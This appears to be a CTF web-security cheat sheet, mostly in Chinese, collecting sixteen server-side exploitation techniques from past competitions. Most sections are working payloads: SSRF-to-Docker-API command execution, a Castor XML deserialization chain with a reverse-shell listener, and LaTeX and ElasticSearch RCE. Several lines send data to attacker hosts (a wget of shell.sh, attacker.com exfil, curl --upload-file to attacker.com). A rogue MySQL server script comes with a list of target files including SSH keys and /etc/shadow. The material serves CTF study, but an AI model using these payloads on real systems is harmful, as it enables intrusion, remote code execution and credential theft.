# CTF Web - Advanced Server-Side Techniques (Part 2)

## Table of Contents
- [通过 SSRF 链到 Docker API RCE（H7CTF 2025）](#ssrf-to-docker-api-rce-chain-h7ctf-2025)
- [通过 xsi:type 多态进行 Castor XML 反序列化（Atlas HTB）](#castor-xml-deserialization-via-xsitype-polymorphism-atlas-htb)
- [Apache ErrorDocument 表达式文件读取（Zero HTB）](#apache-errordocument-expression-file-read-zero-htb)
- [利用 SQLite 文件路径遍历绕过字符串相等检查（Codegate 2013）](#sqlite-file-path-traversal-to-bypass-string-equality-codegate-2013)
- [通过不换行空格进行 HQL 注入（HackIM 2016）](#hql-injection-via-non-breaking-space-hackim-2016)
- [Base64 编码路径遍历（Sharif CTF 2016）](#base64-encoded-path-traversal-sharif-ctf-2016)
- [Windows 8.3 短文件名路径遍历绕过（Tokyo Westerns 2016）](#windows-83-short-filename-path-traversal-bypass-tokyo-westerns-2016)
- [URL parse_url() @ 符号绕过（EKOPARTY CTF 2016）](#url-parse_url--symbol-bypass-ekoparty-ctf-2016)
- [通过 PNG/ZIP Polyglot 的 PHP zip:// 包装器 LFI（PlaidCTF 2016）](#php-zip-wrapper-lfi-via-pngzip-polyglot-plaidctf-2016)
- [通过 Flask 错误页构造 XSS 到 SSTI 链（SECUINSIDE 2016）](#xss-to-ssti-chain-via-flask-error-pages-secuinside-2016)
- [INSERT INTO 双字段 SQLi 列偏移（CyberSecurityRumble 2016）](#insert-into-dual-field-sqli-column-shift-cybersecurityrumble-2016)
- [通过时间戳播种 PRNG 伪造会话 Cookie（CyberSecurityRumble 2016）](#session-cookie-forgery-via-timestamp-seeded-prng-cybersecurityrumble-2016)
- [通过 parse_url/curl URL 解析差异触发 SSRF（33C3 CTF 2016）](#ssrf-via-parse_urlcurl-url-parsing-discrepancy-33c3-ctf-2016)
- [通过 mpost 受限 write18 绕过实现 LaTeX RCE（33C3 CTF 2016）](#latex-rce-via-mpost-restricted-write18-bypass-33c3-ctf-2016)
- [经由 SSRF 利用 ElasticSearch Groovy script_fields RCE（VolgaCTF 2017）](#elasticsearch-groovy-script_fields-rce-via-ssrf-volgactf-2017)
- [恶意 MySQL 服务端 LOAD DATA LOCAL 文件读取（VolgaCTF 2018）](#rogue-mysql-server-load-data-local-file-read-volgactf-2018)

另见：[server-side-advanced.md](server-side-advanced.md) 第 1 部分（ExifTool、Go rune/byte 差异、zip 符号链接遍历、路径遍历绕过、Flask/Werkzeug debug、XXE 外部 DTD、WeasyPrint SSRF、MongoDB 正则注入、Pongo2 SSTI、ZIP PHP webshell、basename() 绕过、React Server Components Flight RCE）。

---

## SSRF to Docker API RCE Chain (H7CTF 2025)

**模式（Moby Dock）：** Web 应用存在 SSRF，暴露了未鉴权的 Docker daemon API（2375 端口）。可通过内部代理端点中转 POST 请求，把 SSRF 串成 RCE。

**步骤 1：通过 SSRF 探测内网服务：**
```bash
# Enumerate localhost ports through SSRF
curl "http://target/validate?url=http://localhost:2375/version"
curl "http://target/validate?url=http://localhost:8090/docs"
```

**步骤 2：通过 Docker archive 端点从运行容器中提取文件：**
```bash
# List containers
curl "http://target/validate?url=http://localhost:2375/containers/json"

# Read files from container filesystem (returns tar archive)
curl "http://target/validate?url=http://localhost:2375/v1.51/containers/<container_id>/archive?path=/flag.txt"
```

**步骤 3：通过 Docker exec API 执行命令（需要 POST 中转）：**

如果 SSRF 只能发 GET，请寻找能转发 POST 的内网端点（例如 `/request?method=post&data=...&url=...`）。

```bash
# 1. Create exec instance
curl "http://target/validate?url=http://localhost:8090/request?method=post\
&data={\"AttachStdout\":true,\"Cmd\":[\"cat\",\"/flag.txt\"]}\
&url=http://localhost:2375/v1.51/containers/<id>/exec"
# Returns: {"Id": "<exec_id>"}

# 2. Start exec instance
curl "http://target/validate?url=http://localhost:8090/request?method=post\
&data={\"Detach\":false,\"Tty\":false}\
&url=http://localhost:2375/v1.51/exec/<exec_id>/start"
```

**拿反弹 shell：**
```bash
# 1. Download shell script into container
# Cmd: ["wget", "http://attacker/shell.sh", "-O", "/tmp/shell.sh"]

# 2. Execute with sh (not bash — busybox containers lack bash)
# Cmd: ["sh", "/tmp/shell.sh"]
```

**可用于利用的关键 Docker API 端点：**
| 端点 | 方法 | 作用 |
|----------|--------|---------|
| `/version` | GET | 确认 Docker API 可达 |
| `/containers/json` | GET | 列出运行中的容器 |
| `/containers/<id>/archive?path=<path>` | GET | 提取文件（tar 格式） |
| `/containers/<id>/exec` | POST | 创建 exec 实例 |
| `/exec/<id>/start` | POST | 启动 exec 实例 |
| `/images/json` | GET | 列出可用镜像 |
| `/containers/create` | POST | 新建容器 |

**关键点：** 2375 上的未鉴权 Docker daemon 几乎等同于容器完全控制权。若 SSRF 只能做 GET，应继续找能中转 POST 的内部代理/请求转发端点。极简容器里常没有 `bash`，优先用 `sh`。

---

## Castor XML Deserialization via xsi:type Polymorphism (Atlas HTB)

**模式：** Castor XML 的 `Unmarshaller` 在没有 mapping file 时会信任 `xsi:type` 属性，从而允许实例化任意 Java 类。

**攻击链：** `xsi:type` -> `PropertyPathFactoryBean` + `SimpleJndiBeanFactory` -> JNDI/RMI -> ysoserial JRMP listener -> `CommonsBeanutils1` gadget -> RCE

**要求：** Java 11，不能是 17+。由于模块访问限制，ysoserial gadget 在 Java 17+ 上会失败。

**使用 Spring bean 构造 RMI 回连的 XML 负载示例：**
```xml
<data xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
      xmlns:java="http://java.sun.com">
  <item xsi:type="java:org.springframework.beans.factory.config.PropertyPathFactoryBean">
    <targetBeanName>
      <item xsi:type="java:org.springframework.jndi.support.SimpleJndiBeanFactory">
        <shareableResources>rmi://ATTACKER:1099/exploit</shareableResources>
      </item>
    </targetBeanName>
    <propertyPath>foo</propertyPath>
  </item>
</data>
```

```bash
# Start ysoserial JRMP listener
java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsBeanutils1 'bash -c {echo,BASE64_PAYLOAD}|{base64,-d}|{bash,-i}'
```

**关键点：** 没有显式 mapping file 的 Castor XML，本质上就是 XML 版反序列化 sink。`xsi:type` 的作用非常接近 Java 的 `ObjectInputStream`，类路径上任意类都可能被实例化。检查 `pom.xml` 时重点关注 `castor-xml`、`commons-beanutils` 和 `commons-collections` 依赖。这里的回连机制依赖 JNDI（Java Naming and Directory Interface）和 RMI（Remote Method Invocation）。

**识别方式：** Java 应用使用 Castor XML 反序列化；`pom.xml` 中出现 `castor-xml`；依赖里包含 `commons-beanutils` / `commons-collections`。

---

## Apache ErrorDocument Expression File Read (Zero HTB)

**模式：** Apache 的 `ErrorDocument` 指令支持表达式语法，可在 Apache 层读取文件，绕过 PHP 引擎禁用。

**要求：** userdir 配置中启用了 `AllowOverride FileInfo`。

**攻击链：**
1. 通过 SFTP（Secure File Transfer Protocol）向子目录上传 `.htaccess`：
```apache
ErrorDocument 404 "%{file:/etc/passwd}"
```
2. 请求该目录下一个不存在的 URL，触发 404 处理逻辑
3. 如需读 PHP 源码，可直接指定文件并用 `cat -v` 观察原始内容：
```apache
ErrorDocument 404 "%{file:/var/www/html/stats.php}"
```

**关键点：** 即便 `php_admin_flag engine off` 禁止了 userdir 中的 PHP 执行，该技巧仍然有效。因为 `%{file:...}` 表达式是 Apache 自己求值，不经过 PHP 解释器，PHP 相关禁用项无效。

**识别方式：** Apache 启用了 `mod_userdir`、`AllowOverride FileInfo`，且子目录中可写 `.htaccess`。

---

## SQLite File Path Traversal to Bypass String Equality (Codegate 2013)

**模式：** PHP 用字符串相等检查阻止某个特定输入值，但随后又把该输入拼进文件路径。路径规范化会绕过前面的字符串检查，同时最终解析到被禁止的资源。

**易受攻击代码：**
```php
if ($_POST['name'] == "GM") die("you can not view&save with 'GM'");
$db = sqlite_open("/var/game_db/gamesim_" . $_SESSION['scrap'] . ".db");
```

**利用：** 把 `name` 设为 `/../gamesim_GM`。这不会命中 `== "GM"` 检查，但拼接后的路径 `/var/game_db/gamesim_/../gamesim_GM.db` 规范化后会变成 `/var/game_db/gamesim_GM.db`。

```bash
curl -X POST -b 'session=...' \
  -d 'name=/../gamesim_GM' \
  'http://target/view.php'
```

**关键点：** 只要用户输入先通过字符串比较校验，后面又被拿来拼接文件系统路径，就可以尝试用 `../` 利用规范化差异绕过检查。这个模式也常见于数据库文件路径和 URL 拼接。

---

## HQL Injection via Non-Breaking Space (HackIM 2016)

Hibernate Query Language 不允许子查询。可利用 HQL 解析器和底层数据库（H2）对字符编码的理解差异绕过：

- HQL 解析器把不换行空格 U+00A0 当普通字符，因此会把 token 粘连成一个词
- H2 数据库把 U+00A0 视为空白符，因此仍能正常拆分 SQL token

**关键点：** 用 U+00A0 替换 SQL 子查询中的普通空格，把子查询偷运过 HQL 校验。

```python
val = u'\u00a0'  # non-breaking space
# HQL sees: "selectXflagXfromXflagXlimitX1" (one token)
# H2 sees:  "select flag from flag limit 1" (valid SQL)
payload = u"' and (cast(concat('->', (select{0}flag{0}from{0}flag{0}limit{0}1)) as int))=0 or ''='".format(val)
```

错误回显提取：把结果强转成 int 会触发报错，错误信息中会包含 flag。

---

## Base64-Encoded Path Traversal (Sharif CTF 2016)

如果文件包含功能把 base64 编码后的文件名作为参数：

```text
file.php?page=aGVscC5wZGY=    (decodes to "help.pdf")
```

那就把目录遍历负载也先编码成 base64：

```python
import base64
# ../index.php
print(base64.b64encode(b"../index.php").decode())  # Li4vaW5kZXgucGhw
# ../../etc/passwd
print(base64.b64encode(b"../../etc/passwd").decode())  # Li4vLi4vZXRjL3Bhc3N3ZA==
```

**关键点：** Base64 会吞掉原始形式的 `../` 等字符，因此能绕过只在明文层面拦截路径遍历字符的过滤器。

---

## Windows 8.3 Short Filename Path Traversal Bypass (Tokyo Westerns 2016)

Windows 上，长文件名通常会自动生成 8.3 短文件名别名。若黑名单只检查完整文件名，那么短文件名即可绕过。

```text
# Blacklisted file: file_list (e.g., readfile('file_list') is blocked)
# Windows 8.3 short name: file_l~1

# Bypass:
GET /read?file=file_l~1

# How 8.3 names are generated:
# - First 6 chars of name (minus spaces/special chars) + ~1
# - Extension truncated to 3 chars
# Examples:
#   "file_list.txt"     -> "FILE_L~1.TXT"
#   "longfilename.html" -> "LONGFI~1.HTM"
#   "program files"     -> "PROGRA~1"

# Discovery: use dir /x on Windows to list short names
# dir /x C:\path\to\files\
```

**关键点：** Windows NTFS 为兼容性会生成 8.3 短文件名。只检查完整文件名的黑名单通常漏掉短别名。只要目标 Windows Web 服务器开启了 8.3 名称生成（默认常见），这个绕过就有效。

---

## URL parse_url() @ Symbol Bypass (EKOPARTY CTF 2016)

PHP 的 `parse_url()` 把 `@` 视为 userinfo 分隔符，会把 `@` 前内容解释为凭证、`@` 后内容解释为主机。这会导致 URL 校验绕过。

```php
// Server validates URL host must be ctf.example.com
// parse_url("http://attacker.com@ctf.example.com/")
//   -> host: ctf.example.com (passes validation)

// But wget/curl follow RFC and connect to attacker.com:
// wget "http://attacker.com@ctf.example.com/"
//   -> Actually connects to: attacker.com

// Exploit for URL shortener/fetcher:
$url = "http://{$attacker_ip}@ctf.ekoparty.org/?";
// parse_url() sees host = ctf.ekoparty.org (passes whitelist)
// wget connects to $attacker_ip (attacker-controlled)

// Check attacker's Apache logs for the flag in User-Agent or request
```

**关键点：** `parse_url()` 与真实 HTTP 客户端（wget、curl、浏览器）对 `@` 的处理不一致。`parse_url()` 取的是 `@` 后的 host，而客户端可能连接 `@` 前的主机。这使域名白名单校验可以被 SSRF 绕过。

---

## PHP zip:// Wrapper LFI via PNG/ZIP Polyglot (PlaidCTF 2016)

**模式（pixelshop）：** PHP `include()` 会追加 `.php` 扩展名（现代 PHP 中已不能用空字节截断）。上传只允许有效图片（`.png`）。此时可用 `zip://` 包装器从嵌入 PNG 中的 ZIP 归档里包含 PHP 代码。

1. 先用 `php://filter/read=convert.base64-encode/resource=` 泄露源码，理解 include 逻辑
2. 上传一个合法 PNG，使服务端生成已知文件名
3. 把 ZIP 归档注入 PNG 调色板数据中。由于 ZIP 的中央目录位于文件尾部，一个合法 PNG 可以同时也是合法 ZIP：

```python
import binascii, requests, struct

def craft_png_zip_polyglot(php_payload):
    """Craft a ZIP payload to inject into PNG palette bytes."""
    # ZIP stores its central directory at the end of the file
    # Calculate offsets based on the known PNG prefix length
    # The ZIP's local file header offset points into the palette region
    # php_payload goes inside the ZIP as "s.php"

    # Pre-built ZIP with s.php containing: <?=`$_GET[a]`?>
    zip_hex = (
        "504B0304140000000800"  # Local file header
        # ... compressed PHP shell ...
        "504B01021400140000000800"  # Central directory
        # ... points back to local header at palette offset ...
        "504B0506000000000100010033000000690000000000"  # End of central directory
    )
    return zip_hex

def inject_payload(image_key, payload_hex):
    """Use the image editor API to set palette bytes containing the ZIP."""
    palette_bytes = binascii.unhexlify(payload_hex)
    # Convert to RGB triplets for palette API
    colors = []
    for i in range(0, len(palette_bytes), 3):
        chunk = palette_bytes[i:i+3].ljust(3, b'\x00')
        colors.append(f'"#{chunk[0]:02x}{chunk[1]:02x}{chunk[2]:02x}"')
    palette_json = ",".join(colors)
    # POST to save endpoint with crafted palette
    requests.post(f"{base_url}?op=save", data={
        "imagekey": image_key,
        "savedata": f'{{"pal": [{palette_json}], "im": [{",".join(["0"]*1024)}]}}'
    })
```

4. 通过 `zip://` 包装器包含其中的 PHP 文件：
```text
http://target/?op=zip://uploads/HASH.png%23s
```
这会把 `HASH.png` 当作 ZIP 解包，并包含其中的 `s.php`。

**关键点：** ZIP 的中央目录在文件尾部，因此几乎任何格式都能在不破坏原格式的情况下追加或嵌入一个有效 ZIP。`zip://` 包装器按内容识别归档，不关心文件扩展名。PNG 调色板数据是一段可控的连续字节，非常适合嵌入小型 ZIP 负载。它能同时绕过：`(a)` 扩展名限制（`.php` -> `.png`），`(b)` 图片校验（文件仍是合法 PNG），`(c)` 元数据清洗（调色板是结构数据，不是元数据）。

---

## XSS to SSTI Chain via Flask Error Pages (SECUINSIDE 2016)

**模式（SBBS）：** Flask 应用在 404 错误页里使用 `render_template_string()` 渲染插入了请求 URL 的消息，而该错误页只对 localhost 请求显示。可以构造 XSS -> localhost 请求 -> 错误页 SSTI 的链。

1. Flask 错误处理器直接把 URL 插进模板：
```python
@app.errorhandler(404)
def not_found(e=None):
    message = "%s was not found on the server." % request.url
    return render_template_string(template % message), 404
```

2. 错误页仅对 127.0.0.1 渲染（外部 IP 只会看到 nginx 404）

3. 用 XSS 触发一个访问 localhost 且 URL 中带 SSTI 的请求：
```javascript
<script>
function hack(url, callback){
    var x = new XMLHttpRequest();
    x.onreadystatechange = function(){
        if (x.readyState == 4)
            window.open('http://attacker.com/exfil?' + x.responseText, '_self', false)
    }
    x.open("GET", url, true);
    x.send();
}
hack("/{{ config.from_object('admin.app') }}{{ config.FLAG }}")
</script>
```

4. `config.from_object('module.path')` 可把应用配置模块加载进 `config` 字典，从而暴露其中的属性

**关键点：** Flask 模板全局对象通常不会直接暴露 `app`，但 `config.from_object()` 能把任意 Python 模块加载到配置字典中，再通过 `{{ config.KEY }}` 访问。这个 XSS -> SSTI 组合能同时绕过两个限制：`(a)` SSTI 只在 localhost 错误页触发，`(b)` 模板全局里没有直接的应用对象引用。遇到错误处理器中对 `render_template_string()` 拼接用户输入时，要优先检查。

---

## INSERT INTO Dual-Field SQLi Column Shift (CyberSecurityRumble 2016)

**模式（Illuminati）：** `INSERT` 语句里有两个可注入字段（subject 最多 40 字符，message 无限长）。可跨字段拼接注入，绕过长度限制。

```sql
-- Original query:
INSERT INTO requests (id, "$subject", "$message")

-- Subject (40 chars max):
theSubject",concat(

-- Message (unlimited):
,(select group_concat(table_name) from information_schema.tables)))#

-- Result:
INSERT INTO requests (id, "theSubject",concat("",(select group_concat(...))))#"...")
```

`concat("", (select ...))` 会把子查询结果包装成 subject 字段的字符串值，从而在用户查看自己的消息时被显示出来。

**关键点：** 如果一条 `INSERT` 查询中有多个可注入字段，而其中一个受长度限制，可以让短字段负责打开一个 `concat(` 表达式，再让长字段负责闭合并插入任意子查询。这种“列偏移”技巧把数据提取从受限字段转移到无限制字段，也可以换成 `CASE WHEN` 或其他跨字段表达式。

---

## Session Cookie Forgery via Timestamp-Seeded PRNG (CyberSecurityRumble 2016)

**模式（Illuminati）：** 会话 Cookie 形如 `random_int-user_id`，其中 `random_int` 由用户最后登录时间戳作为种子生成。先通过 SQLi 提取管理员时间戳，再复现 PRNG，最后伪造 Cookie。

```python
import random

# 1. Extract admin login timestamp via SQLi
admin_timestamp = 1229569179  # from: SELECT last_login FROM users WHERE id=209

# 2. Seed PRNG with timestamp
random.seed(admin_timestamp)

# 3. Generate the same random int the server produced
cookie_random = random.randint(0, 2**31)

# 4. Forge admin cookie
admin_cookie = f"{cookie_random}-209"
# Result: "1229569179-209"
```

**关键点：** 只要会话随机数依赖单一可预测种子（时间、PID、计数器），它就是可复现的。若登录时间戳能通过 SQLi、报错或 API 泄露出来，整个 token 就能被还原。审计时重点关注 `random.seed(time())`、`srand(time(NULL))` 之类的写法。

---

## SSRF via parse_url/curl URL Parsing Discrepancy (33C3 CTF 2016)

**模式（list0r）：** PHP `parse_url()` 与 curl 对包含多个 `@` 的 URL 解析不同。URL `http://what:ever@127.0.0.1:80@allowed.host/path` 会让 PHP 看到 `host = allowed.host`，从而通过 CIDR/域名白名单；但 curl 实际会连到 `127.0.0.1:80`，从而形成对 localhost 的 SSRF。

```php
// PHP parse_url behavior:
parse_url("http://what:ever@127.0.0.1:80@allowed.host/path");
// => ['host' => 'allowed.host', 'user' => 'what', ...]

// curl behavior with same URL:
// Connects to 127.0.0.1:80 (first @ delimits credentials)
// "ever@127.0.0.1:80" parsed as password, but curl connects to first IP

// Exploit: bypass CIDR blacklist by making parse_url see whitelisted host
$url = "http://x:x@127.0.0.1:80@" . $allowed_domain . "/secret/flag";
// parse_url sees $allowed_domain -> passes check
// curl connects to 127.0.0.1:80 -> SSRF achieved
```

**关键点：** 不同 URL 解析器对多个 `@` 的处理不一致。它与 EKOPARTY 2016 的单 `@` 绕过不同，这里利用的是“双 `@`”语义歧义：`parse_url` 取最后一个 `@` 作为 userinfo 分隔符，而 curl 取第一个。遇到 URL 型 SSRF 过滤器时，两种变体都要测。

---

## LaTeX RCE via mpost Restricted write18 Bypass (33C3 CTF 2016)

**模式（pdfmaker）：** `pdflatex` 在受限 `write18` 模式下运行时，只允许执行白名单命令（如 `mpost`）。可利用 `mpost` 的 `-tex` 参数指定替代 TeX 处理器，设成 `bash -c (command)` 即可获得命令执行。由于 mpost 参数解析会吃掉空格，因此用 `${IFS}` 代替空格。

```latex
% Create a MetaPost file via LaTeX
\begin{filecontents}{test.mp}
beginfig(1); endfig; end;
\end{filecontents}

% Execute mpost with bash as the "TeX processor"
\immediate\write18{mpost -ini "-tex=bash -c (cat${IFS}/flag)>out.log" "test.mp"}

% Read the output back into the PDF
\input{out.log}
```

**关键点：** 受限 `write18` 会放行 `mpost`，因为它本来就是 MetaPost 图形生成必需组件。但 `mpost` 的 `-tex` 参数允许指定任意程序充当 “TeX processor”，包括 `bash`。因此一个受限 shell escape 直接升级成完整 RCE。`${IFS}` 用于在被引号包裹的参数里替代空格。

---

## ElasticSearch Groovy script_fields RCE via SSRF (VolgaCTF 2017)

**模式：** 若 SSRF 可以触达内网 ElasticSearch（默认 9200），则 `script_fields` 中的 Groovy 脚本可直接导致 RCE。ElasticSearch 5.0 之前默认允许内联 Groovy 脚本。

```bash
# SSRF payload to ElasticSearch internal API
curl 'http://localhost:9200/_search' -d '{
  "script_fields": {
    "exec": {
      "script": "java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"id\").getText()"
    }
  }
}'

# Read a specific file
curl 'http://localhost:9200/_search' -d '{
  "script_fields": {
    "read": {
      "script": "new java.io.File(\"/flag.txt\").text"
    }
  }
}'

# For blind RCE, exfiltrate via curl upload
curl 'http://localhost:9200/_search' -d '{
  "script_fields": {
    "exfil": {
      "script": "java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"curl --upload-file /flag attacker.com:4042\").getText()"
    }
  }
}'
```

**通过 SSRF（将 JSON URL 编码塞进 GET 参数）：**
```python
import requests
import urllib.parse

es_payload = '{"script_fields":{"exec":{"script":"new java.io.File(\\"/flag.txt\\").text"}}}'
ssrf_url = f"http://localhost:9200/_search?source={urllib.parse.quote(es_payload)}&source_content_type=application/json"

# Through SSRF endpoint
r = requests.get(f"http://target/fetch?url={urllib.parse.quote(ssrf_url)}")
print(r.text)
```

**识别方式：** 存在 SSRF，且内网 9200 端口可访问。可用 `http://localhost:9200/`（返回 ES 版本信息）或 `http://localhost:9200/_cat/indices`（列出索引）确认。

**关键点：** ES 5.0 之前通过 `_search` API 暴露了强大的 Groovy 脚本执行能力。即便没有直接访问权，只要 SSRF 能打到 9200，就可能立即变成 RCE。测试 SSRF 时应始终探测 9200，这是一个常见且高价值的内网服务。

---

### Rogue MySQL Server LOAD DATA LOCAL File Read (VolgaCTF 2018)

**模式：** 当某个服务以开启 `LOAD DATA LOCAL` 的客户端配置连接到你控制的 MySQL 服务器时，你可以在协议层伪造文件读取请求，让客户端把本地任意文件发回来，而不管它原本想执行什么 SQL。

**工作方式：**
1. 受害应用连接到攻击者控制的 MySQL 服务器（例如通过 SSRF 或数据库主机配置错误）
2. 攻击者服务端正常完成握手
3. 当客户端发送任意查询时，恶意服务端返回一个文件传输请求包
4. 客户端读取指定本地文件并把内容发回服务端

```python
# Rogue MySQL server — simplified core logic
import socket

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind(('0.0.0.0', 3306))
server.listen(1)
conn, addr = server.accept()

# Send server greeting (MySQL handshake)
greeting = bytes.fromhex(
    '4a0000000a352e362e32382d'  # version 5.6.28
    '307562756e747530'          # ubuntu0
    '2e31342e30342e31'          # .14.04.1
    '001d000000'                # connection id
    '2a5e2a683e6a2b29'          # auth plugin data part 1
    '00fff70800'                # capability flags
    '210000000000000000000000'  # more fields
    '00'
    '282a4e3b3a592635254a2944'  # auth plugin data part 2
    '00'
)
conn.send(greeting)

# Receive client auth response
conn.recv(4096)

# Send OK packet (auth success)
conn.send(bytes.fromhex('0700000200000002000000'))

# Wait for client to send a query
conn.recv(4096)

# Check client capability bit "Can Use LOAD DATA LOCAL: Set"
# Send rogue file read request for /etc/passwd
dump_etc_passwd = bytes.fromhex('0c000001fb2f6574632f706173737764')
conn.send(dump_etc_passwd)  # rogue MySQL file read request

# Receive file contents from client
file_data = conn.recv(65535)
print(f"[+] Received file contents:\n{file_data.decode(errors='replace')}")

conn.close()
```

**适合请求的文件：**
```text
/etc/passwd                    # User enumeration
/etc/shadow                    # Password hashes (if client runs as root)
/proc/self/environ             # Environment variables with secrets
/var/www/html/config.php       # Application config with DB credentials
/home/user/.ssh/id_rsa         # SSH private keys
/flag.txt                      # CTF flag
```

**关键点：** 恶意 MySQL 服务端可以借助 `LOAD DATA LOCAL` 协议，要求连接它的客户端发送任意本地文件，不受客户端原始查询内容限制。只要你能控制服务所连接的 MySQL 主机（SSRF、配置注入、DNS rebinding 等），这个技巧就值得尝试。前提是客户端库启用了 `LOAD DATA LOCAL`，而许多 MySQL 客户端默认就会开启。
